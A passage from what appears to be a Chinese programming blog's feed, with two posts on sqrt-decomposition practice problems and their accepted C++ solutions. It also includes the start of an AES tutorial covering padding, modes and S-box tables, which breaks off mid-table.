        <content type="html"><![CDATA[<p>谨以此文，纪念我逝去的这6个小时。原本昨天开开心心学学分块，但是入门2就卡住了，卡到生活都不能自理了。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/1.png" alt="1"></p><p>题目意思还是很清晰的。要求区间加法，区间查询符合条件的值。至于加法完全可以照搬前一道题目的方式，但是查询的操作着实有点耐人寻味了，因为区间查询意味着我们得采用分块的思想，不能暴力求解。首先我想到让每一个块变得有序，然后lower_bound查到第一个大于等于某个值的第一个元素的位置。首先对所有块排序的复杂度为√n * √n log_2(√n)也就是nlog_2(n)的复杂度，然后每一次查询最多是√n的复杂度，每一次区间加法是√n的复杂度，区间加法还要对固定两个残缺块进行重新排序(因为两边的残缺块可能会破坏有序结构，而中间的则会保持原来的顺序)，这又需要2√nlog_2(√n)的复杂度。查询和加法一起是n√n的复杂度，所以整个算法就是n√n的复杂度，理论可行但是实践可惨死了。</p><p>首先，序列排序直接破坏了它的序列结构，这导致我在前一天20点-24点的提交一直不通过。后来我意识到了不能破坏它原有的序列，于是想到每个块用一个vector去保存。更新的时候clear再一个个push然后一个sort即可。然后又不行，发现是边界问题，因为我过于追求极限，因此会判断两边的块是否为完整块，完整则一起处理，不完整则先处理，这样导致如果没有处理，那么下面的循环条件没注意就不会被处理了。所以最好的方法就是，不管它，l那个点所在的块我就先处理，管你玩不完整的，右边的r也一样。</p><p>处理完了这个之后，我又被90分卡住了，最后发现是最后一个不完整的块它没有预先排序，但是其实是要的，虽然我也不知道为什么，因为我当时是感觉，它不可能会被当成一个完整的块，就基本没去管它了。但是事实就是这么魔幻：不管我就不让你过，就搞你心态。</p><p>然后来看看孩子的提交记录吧。</p><p><img src="/2021/12/23/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A82/2.png" alt="2"></p><p>真的是太不容易了，下面给出我的AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],bl[maxn],tag[maxn],block,n;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v[maxn];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    v[x].<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x*block;i&lt;<span class="built_in">min</span>((x+<span class="number">1</span>)*block,n);i++)&#123;</span><br><span class="line">        v[x].<span class="built_in">push_back</span>(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(v[x].<span class="built_in">begin</span>(),v[x].<span class="built_in">end</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[l]);</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        a[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">update</span>(bl[r]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        tag[i]+=c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=<span class="built_in">min</span>(bl[l]*block+block<span class="number">-1</span>,r);i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(bl[l]==bl[r])<span class="keyword">return</span> ans;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[r]*block;i&lt;=r;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]+tag[bl[i]]&lt;num)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=bl[l]+<span class="number">1</span>;i&lt;bl[r];i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=<span class="built_in">lower_bound</span>(v[i].<span class="built_in">begin</span>(),v[i].<span class="built_in">end</span>(),num-tag[i])-v[i].<span class="built_in">begin</span>();</span><br><span class="line">        <span class="keyword">if</span>(k&gt;<span class="number">0</span>)ans+=k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    block=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        bl[i]=i/block;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;bl[n<span class="number">-1</span>];i++)&#123;</span><br><span class="line">        <span class="built_in">update</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        l--,r--;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)<span class="built_in">add</span>(l,r,c);</span><br><span class="line">        <span class="keyword">else</span> cout&lt;&lt;<span class="built_in">query</span>(l,r,c*c)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> 分块 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分块入门</title>
      <link href="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/"/>
      <url>/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>最近cf刷的有点难，请教一位大神，大神曰，“汝之惑，分块也”，所以小菜鸡来学分块了。</p><span id="more"></span><h1 id="数列分块"><a href="#数列分块" class="headerlink" title="数列分块"></a>数列分块</h1><p>分块是我感觉是最优雅的暴力了，适用于同时区间修改和区间查询，而且书写十分方便。对于动态维护序列的题目我们一般会想到树状数组和线段树结构。</p><p>树状数组的限制十分明显，不能同时进行区间修改和区间查询地操作，只能支持单点修改+区间查询或者是区间修改和单点查询。虽然此题可以用树状数组做，但是主要还是练习一下分块。</p><p>线段树可以说是非常棒的动态维护序列的数据结构了，时间复杂度非常优秀，但是书写起来十分复杂。</p><p>分块也并不是万能的，如果同时区间修改和区间查询且数据范围在1e6的范围，那么分块就很可能超时了，此时只能使用线段树结构去维护这个序列。</p><p>各有优缺点吧，主要是分块的这个思想得学会，在很多地方都用得到。</p><p>下面给出分块算法中的一些特有名词</p><p>区间：数列中连续一段的元素</p><p>区间操作：将某个区间[a,b]的所有元素进行某种改动的操作</p><p>块：我们将数列划分成若干个不相交的区间，每个区间称为一个块</p><p><strong>整块</strong>：在一个区间操作时，完整包含于区间的块</p><p><strong>不完整的块</strong>：在一个区间操作时，只有部分包含于区间的块，即区间左右端点所在的两个块</p><h2 id="入门1"><a href="#入门1" class="headerlink" title="入门1"></a><a href="https://loj.ac/p/6277">入门1</a></h2><p>本道练习题在loj上，链接已经给出。</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>数据范围在5w，如果用朴素的算法那么必超时的。这个时候我们可以把整个序列分成一块一块的，那么到底怎么分呢，最优的分法应该是每一块包含(int)sqrt(n)个数据，最多能把数据分成(int)sqrt(n)+1块。那么在进行一次区间修改的时候，我们同样可以把区间按照分块的方式去操作，对于一个区间分出的每一个块，如果这个块有sqrt(n)个数据那么称这个块是完整的，否则是不完整的。对于完整的块，我们可以给一个标记数组，标记这个块整体都被加上了某个值；对于不完整的块我们可以对整个不完整的块内的数据进行单点修改。那么一次区间修改的操作复杂度就是sqrt(n)了。单点查询的时候只需要找到那个元素的值加上那个元素所在区间的标记就是该元素的实际值。</p><p>这里需要考虑以下几种情况：</p><p>左端点在块的起点，右端点不在另一个块的终点：需要先处理右端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点不在块的起点，右端点在另一个块的终点：需要先处理左端点所在的不完整的块的元素值之后，对剩下的完整的块进行区间标记。</p><p>左端点在块的起点，右端点在另一个块的终点：直接对所有块进行标记即可。</p><p>左端点与右端点在同一个块上，且完整占据整个块：直接对该块标记。</p><p>左端点与右端点在同一个块上，且不完整占据整个块：直接对区间内的元素进行修改即可。</p><p>刚开始考虑情况不周，导致WA了很多次，下面贴出AC代码和测评情况。</p><p>标程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 50005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>  std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">int</span> block[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> q=n;</span><br><span class="line">    <span class="keyword">int</span> block_size=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> opt,l,r,c,i;</span><br><span class="line">        cin&gt;&gt;opt&gt;&gt;l&gt;&gt;r&gt;&gt;c;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)/block_size==(r<span class="number">-1</span>)/block_size)&#123;</span><br><span class="line">                <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size==<span class="number">0</span>&amp;&amp;r%block_size==<span class="number">0</span>)&#123;</span><br><span class="line">                    block[(l<span class="number">-1</span>)/block_size+<span class="number">1</span>]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">                        a[i]+=c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>((l<span class="number">-1</span>)%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(i=l;i&lt;=<span class="built_in">min</span>(((l<span class="number">-1</span>)/block_size+<span class="number">1</span>)*block_size,r);i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                l=i<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(r%block_size!=<span class="number">0</span>)&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">for</span>(i=<span class="built_in">max</span>((r<span class="number">-1</span>)/block_size*block_size+<span class="number">1</span>,l);i&lt;=r;i++)&#123;</span><br><span class="line">                    a[i]+=c;</span><br><span class="line">                &#125;</span><br><span class="line">                r=r/block_size*block_size;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=l/block_size+<span class="number">1</span>;i&lt;=r/block_size;i++)&#123;</span><br><span class="line">                block[i]+=c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a[r]+block[(r<span class="number">-1</span>)/block_size+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本蒟蒻测评的状况</p><p><img src="/2021/12/22/%E5%88%86%E5%9D%97%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>这算正式入门了以下这个分块吧，后面把这个分块的所有入门都做了先。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> 分块 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AES加密学习</title>
      <link href="/2021/12/18/AES%E5%8A%A0%E5%AF%86/"/>
      <url>/2021/12/18/AES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>今天来学学AES。</p><span id="more"></span><h1 id="AES简介"><a href="#AES简介" class="headerlink" title="AES简介"></a>AES简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图：</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/1.png" alt="1"></p><h2 id="分组问题"><a href="#分组问题" class="headerlink" title="分组问题"></a>分组问题</h2><p>AES属于分组加密，什么是分组加密呢，顾名思义，分组加密=分组+加密(狗头。分组就是说把它分成一个个组进行加密，可以把它和base64作为一个对比，base64是三个字符一组进行编码，那么既然是要分组那必然也会遇到分组不满的情况，这个时候需要加上填充。这个填充呢，有很多种方案。</p><h3 id="零字节填充"><a href="#零字节填充" class="headerlink" title="零字节填充"></a>零字节填充</h3><p>这个可以说是比较常见的手段了，一般人一般也都能想得到，但是这样的话难以区分末尾的0到底是它的信息本来就存在的还是填充的，信息表达不明确。</p><h3 id="填充n位n"><a href="#填充n位n" class="headerlink" title="填充n位n"></a>填充n位n</h3><p>这个略有点意思。但是假如它本来信息就有n位n呢？那么最后的那n位n还是没办法区分是不是它本来就有的。</p><p>那么最终AES采取了哪种填充方式呢？它选择在第二种方案中改进，如果长度刚好不需要填充，那么就填充16位16。这么一来，如果它末尾存在了n位n，但是由于长度满足16的倍数，那么还会填充16位16，这样它就能够区分填充位和明文位了。</p><h2 id="AES常见分类"><a href="#AES常见分类" class="headerlink" title="AES常见分类"></a>AES常见分类</h2><p>AES有三种常见加密标准，根据密钥位数不同用于区分，密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（字节)</th><th>分组长度(字节)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>16</td><td>16</td><td>10</td></tr><tr><td>AES-192</td><td>24</td><td>16</td><td>12</td></tr><tr><td>AES-256</td><td>32</td><td>16</td><td>14</td></tr></tbody></table><p>AES还有五种加密模式：1.电码本模式（Electronic Codebook Book (ECB)）；2.密码分组链接模式（Cipher Block Chaining (CBC)）；3.计算器模式（Counter (CTR)）；4.密码反馈模式（Cipher FeedBack (CFB)）；5.输出反馈模式（Output FeedBack (OFB)）。</p><p>本片博客只介绍前两种模式。</p><h1 id="AES加密流程"><a href="#AES加密流程" class="headerlink" title="AES加密流程"></a>AES加密流程</h1><p>AES的EBC模式大概可以用下面的流程图图表示</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/2.png" alt="2"></p><h2 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h2><p>官方的解释是，建立16*16的字节表，然后把自己拆成高4位和低四位，高四位位行，第四位为列好去查表替换。这个很好理解，其实就是在0x00-0xff字节内建立双射，让每个字节替换为其它字节。比如最简单的，我让所有字节都加1%256，也是一个双射变换。那么既然是一个双射，那么我们很容易求出它的逆。</p><p>一般AES加密用以下的字节替换表</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>那么它的逆表就是</p><table><thead><tr><th>行/列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>